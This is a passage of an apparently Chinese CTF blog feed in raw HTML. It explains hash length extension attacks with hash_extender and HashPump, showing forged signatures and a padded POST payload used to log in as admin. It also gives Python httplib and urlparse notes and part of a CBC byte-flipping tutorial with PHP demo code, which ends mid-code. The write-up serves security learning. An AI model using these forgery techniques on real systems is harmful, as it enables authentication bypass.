HashExtender</span><br><span class="line"></span><br><span class="line">Usage</span><br><span class="line">&gt;&gt;&gt; import hashext</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hashext.md5(data = <span class="string">'123'</span>, sign = <span class="string">'109889f941630d269546335f728f3558'</span>, length = 5, append = <span class="string">'test'</span>)</span><br><span class="line">(<span class="string">'123\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00test'</span>, <span class="string">'e5f78513e536615a6f5164ccff96d4d9'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ● data - your original signed message</span><br><span class="line">  ● sign - message signature, MD5(secret + msg)</span><br><span class="line">  ● length - probable length of secret string</span><br><span class="line">  ● append - data to append to new string</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line"></span><br><span class="line">  1. git <span class="built_in">clone</span> https://github.com/iagox86/hash_extender  </span><br><span class="line">  2. <span class="built_in">cd</span> hash_extender  </span><br><span class="line">  3. make  </span><br><span class="line"></span><br><span class="line">useage</span><br><span class="line"></span><br><span class="line"> ./hash_extender &lt;--data=|--file=&gt; --signature= --format= [options]</span><br><span class="line"></span><br><span class="line">INPUT OPTIONS</span><br><span class="line">-d --data=</span><br><span class="line">      The original string that we<span class="string">'re going to extend.</span></span><br><span class="line"><span class="string">--data-format=</span></span><br><span class="line"><span class="string">      The format the string is being passed in as. Default: raw.</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">--file=</span></span><br><span class="line"><span class="string">      As an alternative to specifying a string, this reads the original string</span></span><br><span class="line"><span class="string">      as a file.</span></span><br><span class="line"><span class="string">-s --signature=</span></span><br><span class="line"><span class="string">      The original signature.</span></span><br><span class="line"><span class="string">--signature-format=</span></span><br><span class="line"><span class="string">      The format the signature is being passed in as. Default: hex.</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">-a --append=</span></span><br><span class="line"><span class="string">      The data to append to the string. Default: raw.</span></span><br><span class="line"><span class="string">--append-format=</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">-f --format= [REQUIRED]</span></span><br><span class="line"><span class="string">      The hash_type of the signature. This can be given multiple times if you</span></span><br><span class="line"><span class="string">      want to try multiple signatures. '</span>all<span class="string">' will base the chosen types off</span></span><br><span class="line"><span class="string">      the size of the signature and use the hash(es) that make sense.</span></span><br><span class="line"><span class="string">      Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool</span></span><br><span class="line"><span class="string">-l --secret=</span></span><br><span class="line"><span class="string">      The length of the secret, if known. Default: 8.</span></span><br><span class="line"><span class="string">--secret-min=</span></span><br><span class="line"><span class="string">--secret-max=</span></span><br><span class="line"><span class="string">      Try different secret lengths (both options are required)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OUTPUT OPTIONS</span></span><br><span class="line"><span class="string">--table</span></span><br><span class="line"><span class="string">      Output the string in a table format.</span></span><br><span class="line"><span class="string">--out-data-format=</span></span><br><span class="line"><span class="string">      Output data format.</span></span><br><span class="line"><span class="string">      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy</span></span><br><span class="line"><span class="string">--out-signature-format=</span></span><br><span class="line"><span class="string">      Output signature format.</span></span><br><span class="line"><span class="string">      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OTHER OPTIONS</span></span><br><span class="line"><span class="string">-h --help </span></span><br><span class="line"><span class="string">      Display the usage (this).</span></span><br><span class="line"><span class="string">--test</span></span><br><span class="line"><span class="string">      Run the test suite.</span></span><br><span class="line"><span class="string">-q --quiet</span></span><br><span class="line"><span class="string">      Only output what'</span>s absolutely necessary (the output string and the</span><br><span class="line">      signature)</span><br></pre></td></tr></table></figure></p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ./hash_extender -f sha256 -l 9 -d <span class="string">';0:b'</span> -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a <span class="string">';1:b'</span> --out-data-format=html  </span><br><span class="line"></span><br><span class="line">Type: sha256  </span><br><span class="line">Secret length: 9  </span><br><span class="line">New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560  </span><br><span class="line">New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab</span><br></pre></td></tr></table></figure></p><p>-f 代表加密方式</p><p>-l key的长度</p><p>-s 原始的hash值</p><p>-a 添加的值</p><p>–out-data-format 输出的格式</p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install hashpumpy</span><br></pre></td></tr></table></figure></p><p>Usage<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: pcat</span><br></pre></td></tr></table></figure></p><p>或者直接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br></pre></td></tr></table></figure></p><p>就会得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3e67e8f0c05e1ad68020df30bbc505f5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat</span><br></pre></td></tr></table></figure></p><p>第一个是新的签名，把它设置到cookies的getmein里。<br>第二个先把\x替换为%后，post提交<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat</span><br></pre></td></tr></table></figure></p><h2 id="os-命令介绍"><a href="#os-命令介绍" class="headerlink" title="os 命令介绍"></a>os 命令介绍</h2><h3 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen"></a>os.popen</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">os.system(cmd) 的返回值只会有 0(成功),1,2</span><br><span class="line"></span><br><span class="line">os.popen(cmd) 会吧执行的 cmd 的输出作为值返回。</span><br><span class="line"></span><br><span class="line">os.popen() 可以实现一个“管道”，从这个命令获取的值可以继续被调用。而 os.system 不同，它只是调用，调用完后自身退出，可能返回个 0 吧</span><br><span class="line"></span><br><span class="line">比如，我想得到 ntpd 的进程 id，就要这么做：</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">'ps -C ntpd | grep -v CMD |awk '</span>&#123; <span class="built_in">print</span> <span class="variable">$1</span> &#125;<span class="string">').readlines()[0]</span></span><br></pre></td></tr></table></figure><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p>将urlstring解析成6个部分，它从urlstring中取得URL，并返回元组 (scheme, netloc, path, parameters, query, fragment)，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import urlparse</span><br><span class="line">&gt;&gt;&gt; url=urlparse.urlparse(<span class="string">'http://www.baidu.com/index.php?username=guol'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">'username=guol'</span>, fragment=<span class="string">''</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url.netloc</span><br><span class="line">www.baidu.com</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">urlparse.urlunparse(parts)</span><br><span class="line"></span><br><span class="line">    从一个元组构建一个url，元组类似urlparse返回的，它接收元组(scheme, netloc, path, parameters, query, fragment)后，会重新组成一个具有正确格式的URL，以便供Python的其他HTML解析模块使用。</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; import urlparse</span><br><span class="line">&gt;&gt;&gt; url=urlparse.urlparse(<span class="string">'http://www.baidu.com/index.php?username=guol'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> url</span><br><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com'</span>, path=<span class="string">'/index.php'</span>, params=<span class="string">''</span>, query=<span class="string">'username=guol'</span>, fragment=<span class="string">''</span>)</span><br><span class="line">&gt;&gt;&gt; u=urlparse.urlunparse(url)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> u</span><br><span class="line">http://www.baidu.com/index.php?username=guol</span><br></pre></td></tr></table></figure><p>Example：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from urlparse import urlparse</span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">urlparts = urlparse(url)</span><br><span class="line"><span class="built_in">print</span> urlparts.hostname,urlparts.port,urlparts.scheme</span><br><span class="line"></span><br><span class="line">输出：web.jarvisoj.com 32778 http</span><br></pre></td></tr></table></figure></p><h2 id="HTTPConnection"><a href="#HTTPConnection" class="headerlink" title="HTTPConnection"></a>HTTPConnection</h2><h3 id="HTTPConnection创建对象"><a href="#HTTPConnection创建对象" class="headerlink" title="HTTPConnection创建对象"></a>HTTPConnection创建对象</h3><p>HTTPConnection(host[, port[, strict[, timeout]]])<br>host: 请求的服务器host，不能带http://开头<br>port: 服务器web服务端口<br>strict: 是否严格检查请求的状态行，就是http1.0/1.1 协议版本的那一行，即请求的第一行，默认为False，为True时检查错误会抛异常<br>timeout: 单次请求的超时时间，没有时默认使用httplib模块内的全局的超时时间</p><h3 id="HTTPConnection对象request方法："><a href="#HTTPConnection对象request方法：" class="headerlink" title="HTTPConnection对象request方法："></a>HTTPConnection对象request方法：</h3><p>说明：<br>发送一个请求</p><p>原型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conn.request(method, url[, body[, headers]])</span><br><span class="line">method: 请求的方式，如<span class="string">'GET'</span>,<span class="string">'POST'</span>,<span class="string">'HEAD'</span>,<span class="string">'PUT'</span>,<span class="string">'DELETE'</span>等</span><br><span class="line">url: 请求的网页路径。如：<span class="string">'/index.html'</span></span><br><span class="line">body: 请求是否带数据，该参数是一个字典</span><br><span class="line">headers: 请求是否带头信息，该参数是一个字典，不过键的名字是指定的http头关键字</span><br></pre></td></tr></table></figure></p><h3 id="HTTPConnection对象getresponse方法"><a href="#HTTPConnection对象getresponse方法" class="headerlink" title="HTTPConnection对象getresponse方法"></a>HTTPConnection对象getresponse方法</h3><p>说明：<br>获取一个http响应对象，相当于执行最后的2个回车</p><p>原型/实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = conn.getresponse()</span><br></pre></td></tr></table></figure></p><h3 id="HTTPResponse对象read方法"><a href="#HTTPResponse对象read方法" class="headerlink" title="HTTPResponse对象read方法"></a>HTTPResponse对象read方法</h3><p>说明：<br>获得http响应的内容部分，即网页源码</p><p>原型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body = res.read([amt])</span><br></pre></td></tr></table></figure></p><p>amt: 读取指定长度的字符，默认为空，即读取所有内容</p><p>实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">body = res.read()  </span><br><span class="line">pbody = res.read(10)</span><br></pre></td></tr></table></figure></p><p>返回：<br>网页内容字符串</p><h3 id="conn-getheaders"><a href="#conn-getheaders" class="headerlink" title="conn.getheaders()"></a>conn.getheaders()</h3><p>说明：</p><p>获得http响应头</p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python    </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-    </span></span><br><span class="line">import httplib  </span><br><span class="line">import urllib  </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">def sendhttp():  </span><br><span class="line">    data = urllib.urlencode(&#123;<span class="string">'@number'</span>: 12524, <span class="string">'@type'</span>: <span class="string">'issue'</span>, <span class="string">'@action'</span>: <span class="string">'show'</span>&#125;)     </span><br><span class="line">    headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,  </span><br><span class="line">               <span class="string">"Accept"</span>: <span class="string">"text/plain"</span>&#125;  </span><br><span class="line">    conn = httplib.HTTPConnection(<span class="string">'bugs.python.org'</span>)  </span><br><span class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/'</span>, data, headers)  </span><br><span class="line">    httpres = conn.getresponse()  </span><br><span class="line">    <span class="built_in">print</span> httpres.status  </span><br><span class="line">    <span class="built_in">print</span> httpres.reason  </span><br><span class="line">    <span class="built_in">print</span> httpres.read()  </span><br><span class="line">             </span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    </span><br><span class="line">    sendhttp()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hash 长度扩展攻击原理和实例&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="hash" scheme="http://archimesan.me/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="http://archimesan.me/2017/12/22/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://archimesan.me/2017/12/22/CBC字节翻转攻击/</id>
    <published>2017-12-22T04:04:31.000Z</published>
    <updated>2019-03-25T03:08:44.031Z</updated>
    
    <content type="html"><![CDATA[<p>CBC 字节翻转攻击原理和例题</p><a id="more"></a><h1 id="CBC-字节翻转攻击原理"><a href="#CBC-字节翻转攻击原理" class="headerlink" title="CBC 字节翻转攻击原理"></a>CBC 字节翻转攻击原理</h1><p>加密过程</p><p><img src="加密过程.png" alt></p><p>Plaintext：待加密的数据。</p><p>IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p><p>Key：被一些如 AES 的对称加密算法使用。</p><p>Ciphertext：加密后的数据。</p><p>在这里重要的一点是，CBC 工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含 16 字节的块。</p><p>因为作者讨厌高数（和译者一样），所以作者造了一些自己的公式（方便记忆）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块</span><br><span class="line">● Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块</span><br></pre></td></tr></table></figure></p><p>注意：正如你所见，前一块的密文用来产生后一块的密文。</p><p><img src="加密过程1.png" alt></p><p>Decryption Process<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</span><br><span class="line">● Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</span><br></pre></td></tr></table></figure></p><p>注意：Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！You got it? 别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：</p><p><img src="加密过程2.png" alt></p><h2 id="一个例子（CBC-Blocks-of-16-bytes）"><a href="#一个例子（CBC-Blocks-of-16-bytes）" class="headerlink" title="一个例子（CBC Blocks of 16 bytes）"></a>一个例子（CBC Blocks of 16 bytes）</h2><p>比方说，我们有这样的明文序列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"name"</span>;s:6:<span class="string">"sdsdsd"</span>;s:8:<span class="string">"greeting"</span>;s:20:<span class="string">"echo 'Hello sdsdsd!'"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>我们的目标是将 “s:6” 当中的数字6转换成数字 “7”。我们需要做的第一件事就是把明文分成 16 个字节的块：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">● Block 1:a:2:&#123;s:4:<span class="string">"name"</span>;</span><br><span class="line">● Block 2:s:6:<span class="string">"sdsdsd"</span>;s:8</span><br><span class="line">● Block 3::<span class="string">"greeting"</span>;s:20</span><br><span class="line">● Block 4::<span class="string">"echo 'Hello sd</span></span><br><span class="line"><span class="string">● Block 5:sdsd!'"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>因此，我们的目标字符位于块 2，这意味着我们需要改变块1的密文来改变第二块的明文。<br>有一条经验法则是（注：结合上面的说明图可以得到），你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。所以我们目标的偏移量是2：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">● [0] = s</span><br><span class="line">● [1] = :</span><br><span class="line">● [2] = 6</span><br></pre></td></tr></table></figure></p><p>因此我们要改变在第一个密文块当中，偏移量是 2 的字节。正如你在下面的代码当中看到的，在第 2 行我们得到了整个数据的密文，然后在第 3 行中，我们改变块1中偏移量为 2 的字节，最后我们再调用解密函数。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="variable">$v</span> = <span class="string">"a:2:&#123;s:4:"</span>name<span class="string">";s:6:"</span>sdsdsd<span class="string">";s:8:"</span>greeting<span class="string">";s:20:"</span><span class="built_in">echo</span> <span class="string">'Hello sdsdsd!'</span><span class="string">";&#125;"</span>;</span><br><span class="line">2. <span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>);</span><br><span class="line">3. <span class="variable">$enc</span>[2] = chr(ord(<span class="variable">$enc</span>[2]) ^ ord(<span class="string">"6"</span>) ^ ord (<span class="string">"7"</span>));</span><br><span class="line">4. <span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>);</span><br></pre></td></tr></table></figure></p><p>运行这段代码后，我们可以将数字 6 变为 7：</p><p><img src="3.png" alt></p><p>但是我们在第 3 行中，是如何改变字节成为我们想要的值呢？</p><p>基于上述的解密过程，我们知道有，A = Decrypt(Ciphertext) 与 B = Ciphertext-N-1 异或后最终得到 C = 6。等价于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C = A XOR B</span><br></pre></td></tr></table></figure></p><p>所以，我们唯一不知道的值就是 A（注：对于B，C来说）（block cipher decryption）;借由 XOR，我们可以很轻易地得到 A 的值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = B XOR C</span><br></pre></td></tr></table></figure></p><p>最后，A XOR B XOR C 等于 0。有了这个公式，我们可以在 XOR 运算的末尾处设置我们自己的值，就像这样：</p><p>A XOR B XOR C XOR “7”会在块 2 的明文当中，偏移量为 2 的字节处得到 7。</p><p>下面是相关原理实现的 PHP 源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'MY_AES_KEY'</span>, <span class="string">"abcdef0123456789"</span>);</span><br><span class="line"><span class="keyword">function</span> aes(<span class="variable">$data</span>, <span class="variable">$encrypt</span>) &#123;</span><br><span class="line">    <span class="variable">$aes</span> = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="string">"1234567891234567"</span>;</span><br><span class="line">    mcrypt_generic_init(<span class="variable">$aes</span>, MY_AES_KEY, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$encrypt</span> ? mcrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>) : mdecrypt_generic(<span class="variable">$aes</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'MY_MAC_LEN'</span>, 40);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> encrypt(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> aes(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> decrypt(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = rtrim(aes(<span class="variable">$data</span>, <span class="literal">false</span>), <span class="string">"\0"</span>);</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span> = <span class="string">"a:2:&#123;s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";&#125;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Plaintext before attack: <span class="variable">$v</span>\n"</span>;</span><br><span class="line"><span class="variable">$b</span> = array();</span><br><span class="line"><span class="variable">$enc</span> = array();</span><br><span class="line"><span class="variable">$enc</span> = @encrypt(<span class="variable">$v</span>);</span><br><span class="line"><span class="variable">$enc</span>[2] =  chr(ord(<span class="variable">$enc</span>[2]) ^ ord(<span class="string">"6"</span>) ^ ord (<span class="string">"7"</span>));</span><br><span class="line"><span class="variable">$b</span> = @decrypt(<span class="variable">$enc</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Plaintext AFTER attack : <span class="variable">$b</span>\n"</span>;</span><br></pre></td></tr></table></figure></p><h1 id="一道ctf题目"><a href="#一道ctf题目" class="headerlink" title="一道ctf题目"></a>一道ctf题目</h1><p><a href="http://47.93.190.246:49168/index.php" target="_blank" rel="noopener">http://47.93.190.246:49168/index.php</a></p><p><img src="1_1.png" alt></p><p>无法用 admin 登录，其它帐号名任意登录。<br>题目提示 CBC 字节翻转 有 .index.php.swp 文件下载。<br>用 vim -r .index.php.swp 打开即，用 :w index.php 另存为 index.php，即可还原出源代码。<br>关键代码段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_random_iv</span></span>()&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;16;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    <span 